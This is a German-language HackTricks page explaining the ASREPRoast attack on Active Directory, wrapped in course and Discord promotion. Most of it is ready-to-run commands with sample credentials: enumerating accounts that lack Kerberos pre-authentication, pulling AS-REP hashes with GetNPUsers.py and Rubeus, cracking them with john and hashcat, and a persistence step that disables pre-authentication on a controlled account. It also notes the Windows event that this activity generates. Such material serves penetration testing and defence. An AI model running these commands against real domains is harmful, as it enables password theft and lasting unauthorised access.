# ASREPRoast

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github Repositories senden.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Treten Sie dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-Jägern zu kommunizieren!

**Hacking Insights**\
Beschäftigen Sie sich mit Inhalten, die sich mit dem Nervenkitzel und den Herausforderungen des Hackens befassen.

**Echtzeit-Hack-News**\
Bleiben Sie mit der schnelllebigen Hacking-Welt durch Echtzeit-Nachrichten und Einblicke auf dem Laufenden.

**Neueste Ankündigungen**\
Bleiben Sie über die neuesten Bug-Bounties und wichtige Plattformupdates informiert.

**Treten Sie uns auf** [**Discord**](https://discord.com/invite/N3FrSbmwdy) bei und beginnen Sie noch heute mit Top-Hackern zusammenzuarbeiten!

## ASREPRoast

ASREPRoast ist ein Sicherheitsangriff, der Benutzer ausnutzt, die das Attribut **Kerberos-Vorauthentifizierung erforderlich** nicht aktiviert haben. Diese Schwachstelle ermöglicht es Angreifern im Wesentlichen, eine Authentifizierung für einen Benutzer vom Domänencontroller (DC) anzufordern, ohne das Passwort des Benutzers zu benötigen. Der DC antwortet dann mit einer mit dem vom Benutzer abgeleiteten Passwort verschlüsselten Nachricht, die Angreifer offline knacken können, um das Passwort des Benutzers zu ermitteln.

Die Hauptanforderungen für diesen Angriff sind:
- **Fehlende Kerberos-Vorauthentifizierung**: Zielbenutzer müssen diese Sicherheitsfunktion nicht aktiviert haben.
- **Verbindung zum Domänencontroller (DC)**: Angreifer benötigen Zugriff auf den DC, um Anfragen zu senden und verschlüsselte Nachrichten zu empfangen.
- **Optionales Domänenkonto**: Das Vorhandensein eines Domänenkontos ermöglicht es Angreifern, anfällige Benutzer effizienter durch LDAP-Abfragen zu identifizieren. Ohne ein solches Konto müssen Angreifer Benutzernamen erraten.


#### Ermittlung anfälliger Benutzer (erfordert Domänenanmeldeinformationen)

{% code title="Verwendung von Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% code title="Mit Linux verwenden" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
{% code title="Mit Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% code title="Mit Windows verwenden" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
AS-REP Roasting mit Rubeus generiert eine 4768 mit einem Verschlüsselungstyp von 0x17 und einem Preauth-Typ von 0.
{% endhint %}

### Knacken
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistenz

Erzwingen Sie **Preauth** nicht für einen Benutzer, für den Sie **GenericAll**-Berechtigungen haben (oder Berechtigungen zum Schreiben von Eigenschaften):

{% code title="Verwendung von Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% code title="Mit Linux verwenden" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## Referenzen

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Treten Sie dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-Jägern zu kommunizieren!

**Hacking Insights**\
Beschäftigen Sie sich mit Inhalten, die sich mit dem Nervenkitzel und den Herausforderungen des Hackens befassen.

**Echtzeit-Hack-News**\
Bleiben Sie mit der schnelllebigen Hacking-Welt durch Echtzeit-Nachrichten und Einblicke auf dem Laufenden.

**Neueste Ankündigungen**\
Bleiben Sie über die neuesten Bug-Bounties und wichtige Plattform-Updates informiert.

**Treten Sie uns bei** [**Discord**](https://discord.com/invite/N3FrSbmwdy) bei und beginnen Sie noch heute mit Top-Hackern zusammenzuarbeiten!

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
